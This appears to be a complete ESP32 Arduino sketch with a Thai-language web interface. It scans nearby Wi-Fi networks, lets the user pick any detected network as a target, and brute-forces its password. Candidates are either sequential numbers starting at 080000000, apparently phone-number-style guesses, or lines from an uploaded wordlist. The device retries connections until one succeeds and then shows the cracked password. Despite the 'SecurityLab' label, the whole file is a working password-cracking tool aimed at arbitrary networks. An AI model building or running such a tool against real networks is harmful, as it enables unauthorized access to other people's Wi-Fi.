#include <WiFi.h>
#include <WebServer.h>
#include <LittleFS.h>

const char* ap_ssid = "ESP32-SecurityLab";
const char* ap_pass = "12345678";

WebServer server(80);

String scannedNetworksJSON = "[]";
String targetSSID = "";
String currentCandidate = "";
String foundPassword = "";
String attackMode = "";
bool isTesting = false;
bool isFound = false;
unsigned long attemptCount = 0;
unsigned long currentNumberBase = 80000000;

TaskHandle_t attackTaskHandle = NULL;
File wordlistFile;
File uploadFile;

const char INDEX_HTML[] PROGMEM = R"rawliteral(
<!DOCTYPE html>
<html lang="th">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Wi-Fi Lab Tester</title>
  <style>
    body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; background: #f0f2f5; padding: 20px; color: #333; }
    .card { background: white; max-width: 450px; margin: 0 auto; padding: 24px; border-radius: 12px; box-shadow: 0 4px 12px rgba(0,0,0,0.1); }
    h2 { margin-top: 0; color: #1a1a1a; font-size: 22px; text-align: center; }
    label { font-weight: 600; font-size: 14px; display: block; margin-top: 15px; margin-bottom: 5px; }
    select, button { width: 100%; padding: 12px; border-radius: 8px; border: 1px solid #ccc; font-size: 15px; box-sizing: border-box; }
    button { cursor: pointer; font-weight: bold; border: none; margin-top: 20px; transition: 0.2s; }
    .btn-start { background: #007aff; color: white; }
    .btn-stop { background: #ff3b30; color: white; display: none; }
    .status-box { margin-top: 20px; background: #f8f9fa; border: 1px solid #e9ecef; border-radius: 8px; padding: 15px; font-size: 14px; line-height: 1.8; }
    .highlight { font-weight: bold; color: #007aff; }
    .success-badge { color: #34c759; font-weight: bold; font-size: 16px; text-align: center; margin-top: 15px; }
    .link-upload { display: block; text-align: center; margin-top: 15px; font-size: 12px; color: #666; text-decoration: none; }
  </style>
</head>
<body>
  <div class="card">
    <h2>Wi-Fi Lab Tester</h2>

    <label for="ssidList">เลือกเป้าหมายที่ตรวจพบ:</label>
    <select id="ssidList"><option value="">กำลังโหลดรายการ...</option></select>

    <label for="attackMode">โหมดการทดสอบ:</label>
    <select id="attackMode">
      <option value="sequential">สุ่มตัวเลข (เช่น 080...)</option>
      <option value="wordlist">อ่านจากไฟล์ passwords.txt</option>
    </select>

    <button id="btnStart" class="btn-start" onclick="startTest()">เริ่มการทดสอบ</button>
    <button id="btnStop" class="btn-stop" onclick="stopTest()">หยุดการทดสอบ</button>

    <div class="status-box">
      <div>สถานะ: <span id="txtStatus" class="highlight">พร้อมทำงาน</span></div>
      <div>กำลังทดสอบรหัส: <span id="txtCandidate" class="highlight">-</span></div>
      <div>จำนวนที่ทดสอบแล้ว: <span id="txtAttempts">0</span> ครั้ง</div>
      <div id="boxSuccess" class="success-badge" style="display:none;"></div>
    </div>
    <a href="/upload" class="link-upload">👉 จัดการไฟล์รหัสผ่าน (Wordlist)</a>
  </div>

  <script>
    fetch('/get_networks').then(res => res.json()).then(networks => {
      const select = document.getElementById('ssidList');
      select.innerHTML = networks.length ? '' : '<option value="">ไม่พบเครือข่าย</option>';
      networks.forEach(ssid => select.add(new Option(ssid, ssid)));
    });

    function startTest() {
      const ssid = document.getElementById('ssidList').value;
      const mode = document.getElementById('attackMode').value;
      if (!ssid) return alert('กรุณาเลือกเครือข่ายก่อน');

      fetch(`/start?ssid=${encodeURIComponent(ssid)}&mode=${mode}`).then(() => {
        document.getElementById('btnStart').style.display = 'none';
        document.getElementById('btnStop').style.display = 'block';
        document.getElementById('boxSuccess').style.display = 'none';
      });
    }

    function stopTest() {
      fetch('/stop').then(() => {
        document.getElementById('btnStart').style.display = 'block';
        document.getElementById('btnStop').style.display = 'none';
      });
    }

    setInterval(() => {
      fetch('/status').then(res => res.json()).then(data => {
        document.getElementById('txtStatus').textContent = data.status;
        document.getElementById('txtCandidate').textContent = data.candidate || '-';
        document.getElementById('txtAttempts').textContent = data.attempts;

        if (data.isFound) {
          document.getElementById('boxSuccess').style.display = 'block';
          document.getElementById('boxSuccess').textContent = 'เจอรหัสผ่านแล้ว: ' + data.foundPassword;
          document.getElementById('btnStart').style.display = 'block';
          document.getElementById('btnStop').style.display = 'none';
        }
      });
    }, 1000);
  </script>
</body>
</html>
)rawliteral";

const char UPLOAD_HTML[] PROGMEM = R"rawliteral(
<!DOCTYPE html>
<html lang="th">
<head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Upload Wordlist</title></head>
<body style="font-family: sans-serif; padding: 20px; text-align: center;">
  <h2>อัปโหลดไฟล์ passwords.txt</h2>
  <form method="POST" action="/upload" enctype="multipart/form-data" style="margin-top: 20px;">
    <input type="file" name="uploadFile" accept=".txt" required><br><br>
    <input type="submit" value="อัปโหลดไฟล์" style="padding: 10px 20px; font-weight: bold;">
  </form>
  <br><a href="/">กลับหน้าหลัก</a>
</body>
</html>
)rawliteral";

void attackTask(void *pvParameters) {
  for (;;) {
    if (isTesting && !isFound && targetSSID != "") {
      attemptCount++;

      if (attackMode == "sequential") {
        currentCandidate = "0" + String(currentNumberBase);
        currentNumberBase++;
      }
      else if (attackMode == "wordlist") {
        if (wordlistFile && wordlistFile.available()) {
          currentCandidate = wordlistFile.readStringUntil('\n');

          currentCandidate.replace("\r", "");
          currentCandidate.replace("\n", "");
          currentCandidate.trim();

          if(currentCandidate.length() == 0) continue;
        } else {
          isTesting = false;
          Serial.println("Wordlist finished.");
          if (wordlistFile) wordlistFile.close();
          continue;
        }
      }

      Serial.printf("Testing [%d chars]: %s\n", currentCandidate.length(), currentCandidate.c_str());

      WiFi.disconnect(true);
      vTaskDelay(500 / portTICK_PERIOD_MS);

      WiFi.begin(targetSSID.c_str(), currentCandidate.c_str());

      int timeout = 0;
      while (WiFi.status() != WL_CONNECTED && timeout < 40) {
        if (!isTesting) break;
        vTaskDelay(100 / portTICK_PERIOD_MS);
        timeout++;
      }

      if (WiFi.status() == WL_CONNECTED) {
        isFound = true;
        isTesting = false;
        foundPassword = currentCandidate;
        if (wordlistFile) wordlistFile.close();
        WiFi.disconnect();
      } else {
        WiFi.disconnect(true);
        vTaskDelay(300 / portTICK_PERIOD_MS);
      }
    } else {
      vTaskDelay(500 / portTICK_PERIOD_MS);
    }
  }
}

void performSingleScan() {
  Serial.println("กำลังสแกน Wi-Fi...");
  int n = WiFi.scanNetworks();

  scannedNetworksJSON = "[";
  for (int i = 0; i < n; ++i) {
    if (WiFi.SSID(i).length() > 0) {
      if (scannedNetworksJSON != "[") scannedNetworksJSON += ",";
      scannedNetworksJSON += "\"" + WiFi.SSID(i) + "\"";
    }
  }
  scannedNetworksJSON += "]";
  WiFi.scanDelete();
}

void setup() {
  Serial.begin(115200);
  delay(1000);

  if (!LittleFS.begin(true)) {
    Serial.println("เกิดข้อผิดพลาดในการโหลด LittleFS");
  }

  WiFi.mode(WIFI_AP_STA);
  WiFi.disconnect();
  delay(100);

  performSingleScan();

  WiFi.softAP(ap_ssid, ap_pass);
  Serial.print("Web UI IP: ");
  Serial.println(WiFi.softAPIP());

  server.on("/", HTTP_GET, []() {
    server.send_P(200, "text/html", INDEX_HTML);
  });

  server.on("/get_networks", HTTP_GET, []() {
    server.send(200, "application/json", scannedNetworksJSON);
  });

  server.on("/start", HTTP_GET, []() {
    if (server.hasArg("ssid") && server.hasArg("mode")) {
      targetSSID = server.arg("ssid");
      attackMode = server.arg("mode");

      attemptCount = 0;
      isFound = false;
      foundPassword = "";
      currentNumberBase = 80000000;

      if (attackMode == "wordlist") {
        wordlistFile = LittleFS.open("/passwords.txt", "r");
      }

      isTesting = true;
      server.send(200, "text/plain", "Started");
    } else {
      server.send(400, "text/plain", "Missing Parameter");
    }
  });

  server.on("/stop", HTTP_GET, []() {
    isTesting = false;
    WiFi.disconnect();
    if (wordlistFile) wordlistFile.close();
    server.send(200, "text/plain", "Stopped");
  });

  server.on("/status", HTTP_GET, []() {
    String json = "{";
    json += "\"status\":\"" + String(isTesting ? "กำลังทดสอบ..." : (isFound ? "สำเร็จ" : "หยุดทำงาน")) + "\",";
    json += "\"candidate\":\"" + currentCandidate + "\",";
    json += "\"attempts\":" + String(attemptCount) + ",";
    json += "\"isFound\":" + String(isFound ? "true" : "false") + ",";
    json += "\"foundPassword\":\"" + foundPassword + "\"";
    json += "}";
    server.send(200, "application/json", json);
  });

  server.on("/upload", HTTP_GET, []() {
    server.send_P(200, "text/html", UPLOAD_HTML);
  });

  server.on("/upload", HTTP_POST, []() {
    server.send(200, "text/html", "<h2>อัปโหลดสำเร็จ!</h2><a href='/'>กลับหน้าหลัก</a>");
  }, []() {
    HTTPUpload& upload = server.upload();
    if (upload.status == UPLOAD_FILE_START) {
      uploadFile = LittleFS.open("/passwords.txt", "w");
    } else if (upload.status == UPLOAD_FILE_WRITE) {
      if (uploadFile) uploadFile.write(upload.buf, upload.currentSize);
    } else if (upload.status == UPLOAD_FILE_END) {
      if (uploadFile) uploadFile.close();
    }
  });

  server.begin();

  xTaskCreatePinnedToCore(attackTask, "AttackTask", 4096, NULL, 1, &attackTaskHandle, 1);
}

void loop() {
  server.handleClient();
}
